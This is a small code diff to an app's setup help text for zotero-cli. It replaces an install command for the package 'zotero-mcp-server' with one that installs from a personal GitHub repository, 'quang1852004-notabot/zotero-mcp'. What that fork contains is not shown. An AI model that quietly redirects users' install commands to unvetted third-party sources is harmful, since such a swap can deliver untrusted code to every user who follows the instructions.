@@ -32,7 +32,7 @@ export const PROBLEM: Record<DoctorCheck["id"], { title: string; help: string }>
   },
   cli: {
     title: "zotero-cli isn't installed",
-    help: "The agent works your library through zotero-cli. Install it with one click below, or run `uv tool install zotero-mcp-server` in a terminal.",
+    help: "The agent works your library through zotero-cli. Install it with one click below, or run `uv tool install git+https://github.com/quang1852004-notabot/zotero-mcp.git` in a terminal.",
   },
   node: {
     title: "Node.js wasn't found",
